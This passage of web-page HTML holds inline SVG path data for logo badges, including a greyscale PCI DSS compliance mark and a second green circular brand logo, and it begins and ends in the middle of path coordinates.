            d="M25.5558 36.2354C25.4127 36.1041 25.2149 36.0396 24.9622 36.0396C24.831 36.0396 24.7119 36.0587 24.6093 36.0969C24.5045 36.1351 24.4425 36.1876 24.3686 36.2545C24.297 36.3213 24.2184 36.4001 24.1779 36.4884C24.1397 36.5768 24.1206 36.6722 24.1206 36.7749C24.1206 36.8752 24.1373 36.9706 24.1707 37.059C24.2041 37.1473 24.2541 37.2237 24.3233 37.2881C24.3924 37.3526 24.4782 37.4051 24.5855 37.4409C24.6928 37.4791 24.8167 37.4958 24.9645 37.4958C25.079 37.4958 25.1815 37.4839 25.2697 37.46C25.3579 37.4361 25.4318 37.4051 25.4962 37.3621C25.5605 37.3216 25.613 37.2714 25.6559 37.2165C25.6821 37.1807 25.706 37.1425 25.7274 37.1043L25.5224 37.0351C25.489 37.1354 25.4223 37.2141 25.3245 37.269C25.2244 37.3239 25.1052 37.3526 24.9669 37.3526C24.8644 37.3526 24.7762 37.3383 24.6975 37.3096C24.6189 37.281 24.5545 37.2404 24.5045 37.1927C24.4544 37.1449 24.4162 37.0852 24.39 37.0184C24.3638 36.9515 24.3519 36.8799 24.3519 36.8059H25.7751C25.7703 36.5553 25.7012 36.3643 25.5558 36.2354ZM24.3471 36.6699C24.3566 36.603 24.3757 36.5409 24.4067 36.4837C24.4377 36.424 24.4782 36.3738 24.5283 36.3285C24.5784 36.2831 24.6403 36.2473 24.7119 36.2211C24.7834 36.1948 24.8668 36.1805 24.9622 36.1805C25.0575 36.1805 25.141 36.1924 25.2125 36.2187C25.2864 36.2449 25.346 36.2783 25.3937 36.3237C25.4413 36.3667 25.4795 36.4192 25.5033 36.4789C25.5272 36.5386 25.5415 36.603 25.5415 36.6699H24.3471Z"
            fill="white"
          ></path>
          <path
            d="M27.0695 37.2523C26.9742 37.3192 26.8478 37.3502 26.6881 37.3502C26.5761 37.3502 26.4831 37.3335 26.4044 37.3001C26.3258 37.2667 26.2638 37.2237 26.2137 37.1688C26.1637 37.1139 26.1279 37.0518 26.1064 36.9826C26.085 36.9134 26.0731 36.8417 26.0731 36.7701C26.0731 36.6985 26.085 36.6293 26.1088 36.5577C26.1327 36.4884 26.1684 36.424 26.2185 36.3691C26.2685 36.3142 26.3305 36.2688 26.4092 36.2354C26.4879 36.202 26.5808 36.1853 26.6881 36.1853C26.8288 36.1853 26.9456 36.2139 27.0386 36.2712C27.1315 36.3285 27.1959 36.4096 27.234 36.5123L27.4343 36.4526C27.3938 36.3213 27.3175 36.2211 27.203 36.1542C27.0719 36.0778 26.9003 36.0396 26.6881 36.0396C26.5522 36.0396 26.4307 36.0587 26.3258 36.0993C26.2209 36.1399 26.1327 36.1924 26.0611 36.2616C25.9896 36.3285 25.9372 36.4073 25.899 36.4956C25.8633 36.5839 25.8442 36.6746 25.8442 36.7725C25.8442 36.8728 25.8609 36.9683 25.8943 37.059C25.9276 37.1473 25.9777 37.2237 26.0468 37.2905C26.116 37.355 26.2018 37.4075 26.3091 37.4433C26.4164 37.4815 26.5403 37.4982 26.6881 37.4982C26.8025 37.4982 26.9074 37.4863 26.9956 37.46C27.0862 37.4362 27.1625 37.4003 27.2269 37.355C27.2913 37.3096 27.3437 37.2547 27.3866 37.1927C27.4176 37.1449 27.4438 37.0924 27.4605 37.0375L27.2483 36.985C27.2245 37.0948 27.1649 37.1855 27.0695 37.2523Z"
            fill="white"
          ></path>
          <path
            d="M19.2741 31.5254C19.2741 31.5254 17.9701 31.5756 17.9844 33.28C17.9987 34.9845 19.8677 34.9487 19.8677 34.9487L20.4136 34.9391L18.4588 33.0413L19.5197 33.0365L21.5031 34.9487L24.688 34.9463L22.8715 33.1798V34.9367L21.1765 33.1654V34.2731L20.3517 33.4925V31.3058L22.1396 33.0676V31.3177L24.6904 33.8959L24.6856 27.6796H15.2906V34.9463H18.3849C17.8223 34.7314 17.1381 34.2516 17.1071 33.2012C17.0547 31.4085 19.0762 31.2986 19.0762 31.2986H20.1037V32.2702L19.2741 31.5254Z"
            fill="white"
          ></path>
          <path
            d="M22.7666 16.0683C22.8405 15.894 22.8762 15.6481 22.8762 15.333C22.8762 15.1325 22.8524 14.9415 22.8023 14.7601C22.7523 14.5811 22.6736 14.4211 22.5616 14.285C22.4519 14.149 22.3112 14.0439 22.1444 13.9723C21.9751 13.9007 21.7534 13.8625 21.4793 13.8625H20.0894V16.8179H21.4793C21.6461 16.8179 21.8321 16.7916 22.0371 16.7367C22.1873 16.6985 22.3279 16.6197 22.459 16.5028C22.5902 16.3882 22.6927 16.2402 22.7666 16.0683ZM21.8654 15.863C21.8178 15.968 21.7534 16.042 21.6723 16.085C21.5889 16.128 21.4506 16.1494 21.2552 16.1494H21.0263V14.5333H21.2599C21.5031 14.5333 21.6747 14.5906 21.7796 14.7076C21.8845 14.8222 21.937 15.037 21.937 15.3497C21.937 15.5861 21.9131 15.7579 21.8654 15.863Z"
            fill="white"
          ></path>
          <path
            d="M25.9515 15.8582C25.9515 15.6959 25.911 15.5503 25.8299 15.4214C25.7489 15.2901 25.6201 15.1826 25.4437 15.0943C25.2673 15.006 24.9741 14.92 24.564 14.8341C24.3996 14.8007 24.2947 14.7649 24.2494 14.7243C24.2041 14.6861 24.1802 14.6455 24.1802 14.5978C24.1802 14.5333 24.2088 14.4784 24.2637 14.4331C24.3185 14.3877 24.3996 14.3662 24.5092 14.3662C24.6403 14.3662 24.7452 14.3972 24.8191 14.4569C24.893 14.5166 24.9431 14.6145 24.9669 14.7482L25.849 14.698C25.8108 14.3925 25.6893 14.1681 25.4866 14.0272C25.284 13.8864 24.9884 13.8172 24.6022 13.8172C24.2875 13.8172 24.0396 13.8553 23.8584 13.9341C23.6772 14.0105 23.5413 14.1179 23.4507 14.2516C23.3602 14.3877 23.3149 14.5309 23.3149 14.6813C23.3149 14.9129 23.4031 15.1039 23.5795 15.2519C23.7535 15.4023 24.0467 15.5216 24.4568 15.6099C24.7071 15.6649 24.8668 15.7198 24.9359 15.7818C25.0051 15.8415 25.0384 15.9107 25.0384 15.9871C25.0384 16.0683 25.0027 16.1375 24.9312 16.1996C24.8597 16.2617 24.7548 16.2903 24.6213 16.2903C24.4425 16.2903 24.3042 16.2306 24.2088 16.1113C24.1492 16.0373 24.1111 15.9298 24.092 15.789L23.2028 15.8439C23.229 16.1423 23.3411 16.3882 23.539 16.5815C23.7368 16.7749 24.0944 16.8728 24.6093 16.8728C24.9026 16.8728 25.1457 16.8322 25.3388 16.7486C25.5319 16.6651 25.6821 16.5457 25.7894 16.3858C25.899 16.2235 25.9515 16.0492 25.9515 15.8582Z"
            fill="white"
          ></path>
          <path
            d="M28.8861 15.4214C28.8051 15.2901 28.6763 15.1826 28.4999 15.0943C28.3235 15.006 28.0303 14.92 27.6203 14.8341C27.4558 14.8007 27.3509 14.7649 27.3056 14.7243C27.2603 14.6861 27.2364 14.6455 27.2364 14.5978C27.2364 14.5333 27.2651 14.4784 27.3199 14.4331C27.3747 14.3877 27.4558 14.3662 27.5654 14.3662C27.6965 14.3662 27.8014 14.3972 27.8753 14.4569C27.9492 14.5166 27.9993 14.6145 28.0231 14.7482L28.9052 14.698C28.8671 14.3925 28.7455 14.1681 28.5428 14.0272C28.3402 13.8864 28.0446 13.8172 27.6584 13.8172C27.3437 13.8172 27.0958 13.8553 26.9146 13.9341C26.7334 14.0105 26.5976 14.1179 26.507 14.2516C26.4164 14.3877 26.3711 14.5309 26.3711 14.6813C26.3711 14.9129 26.4593 15.1039 26.6357 15.2519C26.8097 15.4023 27.1029 15.5216 27.513 15.6099C27.7633 15.6649 27.923 15.7198 27.9922 15.7818C28.0613 15.8415 28.0947 15.9107 28.0947 15.9871C28.0947 16.0683 28.0589 16.1375 27.9874 16.1996C27.9159 16.2617 27.811 16.2903 27.6775 16.2903C27.4987 16.2903 27.3604 16.2306 27.2651 16.1113C27.2055 16.0373 27.1673 15.9298 27.1482 15.789L26.259 15.8439C26.2853 16.1423 26.3973 16.3882 26.5952 16.5815C26.793 16.7749 27.1506 16.8728 27.6656 16.8728C27.9588 16.8728 28.2019 16.8322 28.395 16.7486C28.5881 16.6651 28.7383 16.5457 28.8456 16.3858C28.9529 16.2258 29.0077 16.0516 29.0077 15.8606C29.0077 15.6983 28.9672 15.5503 28.8861 15.4214Z"
            fill="white"
          ></path>
          <path
            d="M20.5257 17.6438C20.5566 17.6438 20.5853 17.651 20.6115 17.6629C20.6377 17.6749 20.6592 17.694 20.6758 17.7178C20.6878 17.7322 20.6973 17.756 20.7068 17.7871L20.9881 17.725C20.9524 17.6176 20.8976 17.5364 20.8237 17.4839C20.7497 17.4314 20.6472 17.4051 20.5185 17.4051C20.354 17.4051 20.2253 17.4505 20.1347 17.5412C20.0441 17.6319 19.9988 17.7632 19.9988 17.9327C19.9988 18.0592 20.025 18.1643 20.0751 18.2454C20.1275 18.3266 20.1871 18.3839 20.2587 18.4173C20.3302 18.4507 20.4208 18.465 20.5328 18.465C20.6258 18.465 20.6997 18.4507 20.7593 18.4245C20.8189 18.3982 20.8689 18.3576 20.9095 18.3051C20.95 18.2526 20.9786 18.1881 20.9977 18.1093L20.7188 18.0258C20.7045 18.0902 20.683 18.1404 20.652 18.1738C20.621 18.2072 20.5757 18.2239 20.5137 18.2239C20.4518 18.2239 20.4017 18.2024 20.3683 18.1619C20.3326 18.1189 20.3159 18.0425 20.3159 17.9279C20.3159 17.8372 20.3302 17.768 20.3588 17.725C20.3993 17.6725 20.4541 17.6438 20.5257 17.6438Z"
            fill="white"
          ></path>
          <path
            d="M21.577 17.4075C21.4101 17.4075 21.2814 17.4552 21.186 17.5483C21.0931 17.6414 21.0454 17.7727 21.0454 17.9398C21.0454 18.0592 21.0692 18.1595 21.1169 18.2382C21.1646 18.317 21.2266 18.3767 21.3005 18.4125C21.3744 18.4483 21.4721 18.4674 21.5889 18.4674C21.7033 18.4674 21.7987 18.4459 21.875 18.403C21.9513 18.36 22.0109 18.3003 22.049 18.2239C22.0872 18.1475 22.1086 18.0497 22.1086 17.9303C22.1086 17.7656 22.0633 17.6367 21.9703 17.546C21.8798 17.4529 21.7463 17.4075 21.577 17.4075ZM21.7367 18.1642C21.6986 18.2096 21.6461 18.2311 21.5794 18.2311C21.5126 18.2311 21.4602 18.2096 21.422 18.1642C21.3839 18.1189 21.3648 18.0449 21.3648 17.9422C21.3648 17.8372 21.3839 17.7632 21.422 17.7178C21.4602 17.6725 21.5126 17.651 21.577 17.651C21.6437 17.651 21.6962 17.6725 21.7367 17.7178C21.7773 17.7632 21.7963 17.8324 21.7963 17.9303C21.7916 18.0401 21.7749 18.1189 21.7367 18.1642Z"
            fill="white"
          ></path>
          <path
            d="M23.3673 18.4507V17.4242H22.9501L22.7904 18.0473L22.6283 17.4242H22.2111V18.4507H22.471V17.6677L22.6712 18.4507H22.9072L23.1075 17.6677V18.4507H23.3673Z"
            fill="white"
          ></path>
          <path
            d="M23.5008 17.4242V18.4483H23.8203V18.0688H23.9943C24.123 18.0688 24.2184 18.0401 24.2804 17.9804C24.3424 17.9231 24.3733 17.842 24.3733 17.7369C24.3733 17.6367 24.3447 17.5579 24.2875 17.503C24.2303 17.4481 24.1445 17.4218 24.0301 17.4218H23.5008V17.4242ZM24.0634 17.7489C24.0634 17.7823 24.0515 17.8086 24.0253 17.83C24.0015 17.8515 23.9585 17.8611 23.8966 17.8611H23.8179V17.6319H23.9085C23.9681 17.6319 24.0086 17.6438 24.0301 17.6653C24.0539 17.6892 24.0634 17.7155 24.0634 17.7489Z"
            fill="white"
          ></path>
          <path
            d="M24.4734 17.4242V18.4507H25.2864V18.1977H24.7905V17.4242H24.4734Z"
            fill="white"
          ></path>
          <path
            d="M25.694 17.4242H25.377V18.4483H25.694V17.4242Z"
            fill="white"
          ></path>
          <path
            d="M26.1279 18.2812H26.4879L26.5403 18.4507H26.8717L26.4855 17.4266H26.1398L25.7536 18.4507H26.0778L26.1279 18.2812ZM26.3091 17.6892L26.4235 18.0568H26.197L26.3091 17.6892Z"
            fill="white"
          ></path>
          <path
            d="M27.5916 17.9924L27.2054 17.4242H26.9074V18.4507H27.2054V17.8873L27.5916 18.4507H27.8896V17.4242H27.5916V17.9924Z"
            fill="white"
          ></path>
          <path
            d="M28.6024 18.4507V17.6773H28.9266V17.4242H27.9635V17.6773H28.2854V18.4507H28.6024Z"
            fill="white"
          ></path>
          <path
            d="M22.9311 10.4416C22.9311 10.4416 22.8333 10.3294 22.6998 10.4249C22.5186 10.5515 21.689 11.1053 21.689 11.1053L23.4579 13.4113C23.4579 13.4113 23.4841 13.4901 23.6701 13.4782C23.856 13.4638 24.9884 13.3588 24.9884 13.3588C24.9884 13.3588 25.1934 13.3588 25.2554 13.2132C25.3364 13.0198 27.0743 8.92815 30.4452 5.87253C30.4452 5.87253 30.5882 5.7842 30.3999 5.79375C30.1782 5.8033 28.96 5.79375 28.96 5.79375C28.96 5.79375 28.8956 5.78898 28.8265 5.85343C28.6763 6.0277 26.1541 8.12605 24.5378 11.8334C24.564 11.8978 22.9311 10.4416 22.9311 10.4416Z"
            fill="white"
          ></path>
          <path
            d="M12.1747 10.2984C12.1724 10.1552 12.1747 5.94415 12.1747 5.94415H15.3692C15.3692 5.94415 17.0237 5.87014 17.1143 7.62474C17.1548 9.49392 15.2476 9.48676 15.2476 9.48676H13.9937V10.8164H12.2081L13.6838 14.8413L22.2922 12.1986L21.5388 11.2223C21.5388 11.2223 21.5221 11.091 21.2432 11.1483C20.795 11.196 17.6077 11.461 17.7365 8.36C18.1203 4.99643 22.3303 5.88924 22.4614 5.92266C22.5925 5.95608 22.552 6.02054 22.552 6.02054L22.5449 7.30724C22.5449 7.30724 22.2254 7.16878 21.2599 7.11865C20.2944 7.06852 19.7366 7.63668 19.7461 8.60349C19.7557 9.57031 20.6067 9.79232 21.2361 9.79948C21.8678 9.80664 22.5568 9.71116 22.5568 9.71116C22.5568 9.71116 22.5568 9.93794 22.5639 10.0501C22.5711 10.1623 23.5962 10.709 23.5962 10.709L23.5938 5.80569L25.5105 5.83195L25.5248 9.52257C25.7512 9.08332 27.1482 7.39079 27.2341 7.24279C27.3199 7.09717 27.2341 7.00407 27.2341 7.00407L25.3412 2.12223C25.3412 2.12223 25.3341 1.95513 25.1815 1.96229C25.0289 1.96945 9.36171 2.75962 9.36171 2.75962C9.36171 2.75962 12.0699 10.2411 12.0961 10.3247C12.1223 10.4058 12.1771 10.4416 12.1747 10.2984Z"
            fill="white"
          ></path>
          <path
            d="M15.4193 7.67964C15.4288 7.20697 14.9282 7.15446 14.9282 7.15446C14.9282 7.15446 14.3084 7.08284 14.1963 7.08284C14.0843 7.08284 14.0986 7.15923 14.0986 7.15923L14.1081 8.40774C15.2357 8.40296 15.4121 8.09979 15.4193 7.67964Z"
            fill="white"
          ></path>
        </g>
        <defs>
          <clipPath id="id-PCIDSSCompliantGreyscale">
            <rect width="40" height="40" fill="white"></rect>
          </clipPath>
        </defs>
      </svg>
      <svg
        class="mt-2"
        width="133px"
        height="40px"
        viewBox="0 0 133 40"
        fill="none"
        xmlns="http://www.w3.org/2000/svg"
      >
        <path
          d="M19.9307 40C30.9382 40 39.8615 31.0457 39.8615 20C39.8615 8.9543 30.9382 0 19.9307 0C8.9233 0 0 8.9543 0 20C0 31.0457 8.9233 40 19.9307 40Z"
          fill="#7AC813"
        ></path>
        <path
          d="M13.7278 27.7911C11.8127 27.7911 10.0226 26.7885 9.13796 26.2977C8.23249 25.7964 7.10846 25.1697 5.56812 25.1697C5.07896 25.1697 4.52735 25.3473 4.06941 25.5561C3.93411 25.671 3.79881 25.7964 3.66351 25.9321C4.10064 25.8068 4.5898 25.7232 5.02692 25.7441C6.35911 25.8277 7.54559 26.2454 8.63839 27.0183C10.21 28.1358 11.7399 28.7102 13.1762 28.7206C14.3834 28.7415 15.2265 28.564 16.1007 28.1776C16.9125 27.6031 17.4849 27.0601 17.8804 26.517C16.5587 27.4047 15.6116 27.6867 14.0088 27.7807C13.9151 27.7807 13.8214 27.7911 13.7278 27.7911Z"
          fill="#F5F6F5"
        ></path>
        <path
          d="M13.1657 29.0235C11.667 29.0026 10.0851 28.4073 8.46145 27.2585C7.41028 26.517 6.27584 26.1097 4.99569 26.0366C4.43367 26.0052 3.77799 26.1828 3.26801 26.3603C3.2472 26.3812 3.23679 26.4021 3.21597 26.423C4.56897 27.5718 5.97401 28.0418 7.01478 28.4596C7.85781 28.7938 11.5525 29.5979 14.2481 28.9817C13.9567 29.0131 13.6549 29.0235 13.3218 29.0235C13.2802 29.0235 13.2178 29.0235 13.1657 29.0235Z"
          fill="#F5F6F5"
        ></path>
        <path
          d="M16.1839 19.5822C14.3106 18.6423 12.6453 18.5379 11.5005 18.2245C10.3764 17.9217 9.14834 17.8172 9.31486 16.8668C9.52301 15.718 12.1249 16.4491 12.1249 16.4491C12.1249 16.4491 16.8084 17.4935 18.2655 14.1514C18.2655 14.1514 14.9871 11.9478 10.4077 12.0104C6.4007 12.0627 3.9549 15.0392 3.9549 16.9191C3.9549 18.799 4.67303 20.5744 6.45274 21.5144C7.3374 21.9843 9.73117 22.8198 10.7719 23.0287C11.8127 23.2376 13.1657 23.4465 13.1657 24.1775C13.1657 24.9086 12.2811 24.8564 11.5525 24.8564C10.824 24.8564 8.89855 24.282 7.54555 24.3864C7.54555 24.3864 6.37989 24.2715 5.06852 24.9086C5.23504 24.8773 5.40157 24.8564 5.56809 24.8564C7.19169 24.8564 8.39898 25.5352 9.28364 26.0261C10.1787 26.5274 12.0521 27.5718 13.9879 27.4674C15.7676 27.3734 16.6731 27.0496 18.2759 25.8486C18.5777 25.2219 18.6714 24.6057 18.6714 23.9687C18.6818 23.9687 18.8899 20.9399 16.1839 19.5822Z"
          fill="#F5F6F5"
        ></path>
        <path
          d="M17.308 19.2898C17.922 19.6449 18.4945 20.0522 19.0148 20.5222L19.4312 20.1462C18.8691 19.6971 18.2447 19.3211 17.5994 18.9974L17.308 19.2898Z"
          fill="#F5F6F5"
        ></path>
        <path
          d="M21.6272 22.966C21.3878 22.3603 21.0548 21.8172 20.6593 21.3264L20.0036 21.6501C20.3262 22.1201 20.5864 22.6318 20.7634 23.2063L21.6272 22.966Z"
          fill="#F5F6F5"
        ></path>
        <path
          d="M13.5612 17.8172C14.2377 17.9948 14.9767 18.2246 15.7156 18.5274L15.8613 18.2768C15.0807 18.0052 14.3106 17.7859 13.6028 17.6292L13.5612 17.8172Z"
          fill="#F5F6F5"
        ></path>
        <path
          d="M20.5032 29.1384H21.8354C21.8354 29.1384 22.0955 28.658 22.21 27.6658L21.0444 27.6031C20.8466 28.6475 20.5032 29.1384 20.5032 29.1384Z"
          fill="#F5F6F5"
        ></path>
        <path
          d="M10.3036 17.2324C10.3036 17.2324 10.8448 17.2742 11.6878 17.4099L11.7191 17.2637C10.9177 17.1488 10.4181 17.1175 10.4181 17.1175C10.4181 17.1175 10.262 17.0653 10.2828 17.1593C10.2828 17.2011 10.2412 17.2115 10.3036 17.2324Z"
          fill="#F5F6F5"
        ></path>
        <path
          d="M21.1693 26.2141H22.2413C22.2204 25.7024 22.1476 25.1175 22.0227 24.4595L21.0444 24.5222C21.138 25.1488 21.1693 25.7128 21.1693 26.2141Z"
          fill="#F5F6F5"
        ></path>
        <path
          d="M27.5908 18.1619C28.5899 15.906 30.0678 13.3891 30.7964 12.1776C30.7547 12.1776 30.7131 12.1776 30.6715 12.1776C29.8909 13.5457 28.1632 16.4178 26.3835 18.1306C24.8848 19.5718 23.6671 20.282 22.949 20.6162C24.7807 22.1515 25.6029 24.3447 25.9776 26.1097C26.0505 23.0079 26.5813 20.4491 27.5908 18.1619Z"
          fill="#F5F6F5"
        ></path>
        <path
          d="M23.6775 17.389C23.6775 17.389 23.0114 19.8851 22.9073 20.282C23.6046 19.9478 24.7599 19.2481 26.1753 17.9008C27.8614 16.282 29.5162 13.5875 30.3176 12.1776C28.0487 12.1671 25.5093 12.1671 23.8857 12.2193C20.347 12.3238 19.6705 16.3969 19.6705 16.3969C19.6705 16.3969 22.4286 16.3447 23.1571 16.3447C24.0938 16.3447 23.6775 17.389 23.6775 17.389Z"
          fill="#F5F6F5"
        ></path>
        <path
          d="M35.2821 12.2193C35.2821 12.2193 33.4504 12.1985 31.1711 12.1776C30.4842 13.3055 28.923 15.9374 27.8822 18.2872C26.6125 21.1593 26.1233 24.4491 26.3419 28.752C26.779 27.1541 29.4018 17.4726 29.5579 16.9086C29.714 16.3342 30.1823 16.3865 30.1823 16.3865C30.1823 16.3865 30.9109 16.3865 31.4313 16.3865C35.3862 15.7703 35.2821 12.2193 35.2821 12.2193Z"
          fill="#F5F6F5"
        ></path>
        <path
          d="M19.9828 1.0444C9.52305 1.0444 1.04077 9.55615 1.04077 20.0522C1.04077 30.5483 9.52305 39.0601 19.9828 39.0601C30.4425 39.0601 38.9248 30.5483 38.9248 20.0522C38.9248 9.55615 30.4425 1.0444 19.9828 1.0444ZM19.7746 38.6423C9.54386 38.6423 1.24893 30.3186 1.24893 20.0522C1.24893 9.78592 9.54386 1.46216 19.7746 1.46216C30.0054 1.46216 38.3003 9.78592 38.3003 20.0522C38.3003 30.3186 30.0054 38.6423 19.7746 38.6423Z"
          fill="#F5F6F5"
        ></path>
        <path
          d="M108.865 23.7702C107.532 23.6867 106.2 24.6475 106.117 25.9321C106.013 27.4882 106.086 29.0548 106.075 30.6109C106.075 30.9034 106.263 31.06 106.533 31.0809C106.835 31.1018 107.022 30.9138 107.054 30.6109C107.074 30.423 107.064 30.235 107.064 30.0365C107.064 29.4726 107.064 28.9086 107.064 28.2089C107.772 28.731 108.396 29.0444 109.156 28.9295C110.488 28.731 111.362 27.6136 111.29 26.2245C111.217 24.9086 110.176 23.8538 108.865 23.7702ZM108.646 28.1044C107.688 28.094 106.981 27.3316 107.002 26.3394C107.022 25.3472 107.741 24.6371 108.719 24.6475C109.666 24.6579 110.353 25.4203 110.332 26.4334C110.311 27.4047 109.593 28.1149 108.646 28.1044Z"
          fill="#82C72D"
        ></path>
        <path
          d="M62.3213 23.8016C61.114 23.9269 60.1565 24.9191 60.0836 26.1619C60.042 26.8721 60.0732 27.5822 60.0732 28.3029H60.0628C60.0628 29.0026 60.0628 29.6919 60.0628 30.3916C60.0628 30.7572 60.1253 31.0914 60.5624 31.0914C61.0099 31.0914 61.0515 30.7259 61.0411 30.3812C61.0411 29.8277 61.0411 29.2742 61.0411 28.7102C61.0411 28.5953 60.9995 28.4491 61.114 28.376C61.2493 28.2924 61.3221 28.4491 61.4158 28.5118C62.2172 29.0235 63.0498 29.1697 63.9241 28.7102C64.9961 28.1462 65.5269 26.8198 65.173 25.6292C64.8087 24.376 63.6743 23.6554 62.3213 23.8016ZM62.6439 28.1044C61.7072 28.094 60.9995 27.3629 60.9891 26.3916C60.9787 25.389 61.6968 24.6475 62.6543 24.6475C63.6222 24.6475 64.33 25.3786 64.33 26.3812C64.3404 27.3629 63.6118 28.1149 62.6439 28.1044Z"
          fill="#82C72D"
        ></path>
        <path
          d="M50.009 24.8459C49.4365 24.7102 48.8329 24.7415 48.2917 24.4909C47.8338 24.2715 47.5528 23.9373 47.6048 23.436C47.6464 22.9138 48.0107 22.6527 48.4894 22.5483C49.3949 22.3499 50.2171 22.4439 50.7895 23.3003C50.9457 23.5405 51.185 23.6762 51.4556 23.5091C51.7679 23.3107 51.6846 23.0392 51.5285 22.7781C51.4452 22.6318 51.3307 22.4961 51.2163 22.3707C50.3316 21.4308 48.6456 21.2846 47.4591 22.0157C46.3351 22.7258 46.3142 24.2611 47.4383 25.013C47.9587 25.3577 48.5311 25.5248 49.1451 25.577C49.5302 25.6083 49.8945 25.6919 50.2275 25.9112C50.904 26.3603 50.9977 27.2689 50.4149 27.7284C49.5614 28.4073 48.0003 28.1984 47.3758 27.3107C47.1573 26.9974 46.8971 26.8094 46.564 27.0496C46.1893 27.3107 46.4391 27.624 46.6161 27.8642C47.2301 28.6997 48.1148 28.9817 49.1139 29.0026C49.27 29.0026 49.4261 29.013 49.5823 29.0026C50.6647 28.8982 51.5285 28.2506 51.7366 27.3942C52.0072 26.2036 51.2787 25.1384 50.009 24.8459ZM46.9283 23.1018C46.9283 23.0914 46.9387 23.0809 46.9387 23.0809C46.9387 23.0914 46.9283 23.1018 46.9283 23.1018Z"
          fill="#82C72D"
        ></path>
        <path
          d="M92.3892 26.3394C92.3579 24.8668 91.2755 23.8016 89.8081 23.7807C88.5591 23.7598 87.5184 24.5744 87.2478 25.7859C86.9772 26.9974 87.5704 28.282 88.632 28.752C89.6103 29.1802 90.4846 28.9399 91.338 28.2611C91.4733 28.6371 91.567 29.0026 92.0145 28.9086C92.4516 28.8146 92.41 28.4491 92.3996 28.1149C92.3892 27.5196 92.3996 26.9243 92.3892 26.3394ZM89.7456 28.1044C88.7673 28.0836 88.1116 27.3525 88.1324 26.329C88.1532 25.3159 88.8506 24.6371 89.8497 24.6475C90.776 24.6684 91.4837 25.4308 91.4629 26.3916C91.4421 27.3838 90.7031 28.1253 89.7456 28.1044Z"
          fill="#82C72D"
        ></path>
        <path
          d="M129.389 26.705C129.888 26.7154 130.398 26.705 130.898 26.705C131.418 26.705 131.938 26.705 132.459 26.705C132.781 26.705 133 26.6005 133 26.235C133 25.4308 132.771 24.7206 132.105 24.2298C131.054 23.4569 129.534 23.6763 128.681 24.6893C127.859 25.6606 127.921 27.3734 128.858 28.2193C130.044 29.2951 131.47 29.1071 132.5 28.4073C132.657 28.3029 132.719 28.1358 132.615 27.9478C132.511 27.7598 132.334 27.6658 132.136 27.718C131.907 27.7807 131.689 27.906 131.47 28C130.554 28.3656 129.493 27.9582 129.128 27.1227C129.014 26.8303 129.055 26.6945 129.389 26.705ZM129.097 25.6293C129.274 25.0235 129.888 24.6058 130.627 24.5953C131.293 24.5849 131.834 24.9504 132.042 25.5353C132.147 25.8381 132.115 26.0052 131.741 25.9843C131.345 25.9635 130.939 25.9843 130.544 25.9843C130.148 25.9843 129.742 25.9739 129.347 25.9843C129.097 25.9843 129.024 25.8799 129.097 25.6293Z"
          fill="#82C72D"
        ></path>
        <path
          d="M115.255 23.7703C113.735 23.7807 112.653 24.8878 112.663 26.4334C112.674 27.8851 113.839 29.0026 115.328 28.9713C116.816 28.94 117.888 27.8434 117.888 26.329C117.888 24.8669 116.754 23.7598 115.255 23.7703ZM115.265 28.1045C114.277 28.094 113.6 27.3838 113.621 26.3603C113.642 25.2951 114.318 24.6267 115.349 24.6475C116.316 24.6684 116.972 25.4099 116.951 26.4439C116.941 27.4047 116.223 28.1149 115.265 28.1045Z"
          fill="#82C72D"
        ></path>
        <path
          d="M57.669 23.8225C57.2007 23.812 57.1695 24.1671 57.1695 24.5118C57.1695 25.2951 57.1799 26.0783 57.1695 26.8616C57.1591 27.4256 56.8677 27.8016 56.3369 27.9896C55.2128 28.376 54.3282 27.7807 54.297 26.5901C54.2761 25.8799 54.297 25.1697 54.2865 24.4491C54.2865 24.1045 54.2033 23.8016 53.7766 23.812C53.3915 23.8225 53.3082 24.1044 53.3082 24.4282C53.3082 25.1071 53.3082 25.7859 53.3082 26.4648C53.3186 28.5431 54.9943 29.5666 56.8364 28.6058C56.9821 28.5326 57.107 28.4282 57.2215 28.6266C57.3672 28.8669 57.5754 28.9608 57.8356 28.8669C58.1374 28.752 58.1582 28.4909 58.1582 28.2193C58.1582 27.5927 58.1582 26.9661 58.1582 26.3394C58.1582 25.7337 58.1582 25.1175 58.1582 24.5118C58.1478 24.188 58.1374 23.8329 57.669 23.8225Z"
          fill="#82C72D"
        ></path>
        <path
          d="M70.075 23.9165C69.1279 23.5822 68.2121 23.7598 67.4627 24.4386C66.4532 25.3473 66.4011 26.9974 67.2858 28.0731C68.1392 29.0862 69.9085 29.2742 70.9805 28.4595C71.1678 28.3133 71.2823 28.1567 71.1678 27.9269C71.0638 27.7076 70.8452 27.6658 70.6371 27.718C70.5122 27.7493 70.3873 27.8433 70.2728 27.906C69.3257 28.376 68.2329 28.094 67.7749 27.2585C67.5251 26.799 67.5668 26.7259 68.0663 26.7154C68.5347 26.705 69.003 26.7154 69.4714 26.7154C69.9606 26.7154 70.4393 26.7259 70.9285 26.7154C71.4905 26.705 71.6154 26.5901 71.5842 26.0366C71.5113 25.0131 71.0429 24.2611 70.075 23.9165ZM70.2936 25.9739C69.9085 25.9635 69.5338 25.9739 69.1488 25.9739C68.7324 25.9739 68.3161 25.9739 67.8998 25.9739C67.6605 25.9739 67.546 25.9008 67.6396 25.6292C67.8582 25.0235 68.4618 24.6057 69.18 24.5953C69.8565 24.5849 70.356 24.9295 70.585 25.5457C70.7203 25.859 70.6475 25.9948 70.2936 25.9739Z"
          fill="#82C72D"
        ></path>
        <path
          d="M78.0057 18.5901C78.3388 18.4752 78.2035 18.1828 78.1098 17.9739C77.2043 15.8642 76.2988 13.765 75.3934 11.6554C75.3205 11.4883 75.2373 11.3316 75.0395 11.3212C74.8105 11.3107 74.7169 11.4987 74.644 11.6762C73.7386 13.7859 72.8435 15.8956 71.938 17.9948C71.8548 18.2037 71.7091 18.4439 72.0109 18.5796C72.3231 18.7259 72.448 18.4648 72.5417 18.235C72.6978 17.8903 72.8435 17.5353 72.9788 17.1697C73.0725 16.9086 73.239 16.7937 73.5304 16.8042C74.03 16.8251 74.5399 16.8146 75.0395 16.8146C75.1748 16.8146 75.3205 16.8146 75.4558 16.8146C76.9441 16.8146 76.9441 16.8146 77.5165 18.1932C77.5998 18.4334 77.6935 18.6945 78.0057 18.5901ZM75.2893 16.2089C74.7897 16.2089 74.2902 16.2089 73.7802 16.2089C73.5928 16.2089 73.4055 16.188 73.5096 15.9165C73.9883 14.7676 74.4775 13.6292 75.0083 12.3551C75.4142 13.3055 75.7681 14.1306 76.1219 14.9556C76.6631 16.2089 76.6527 16.2089 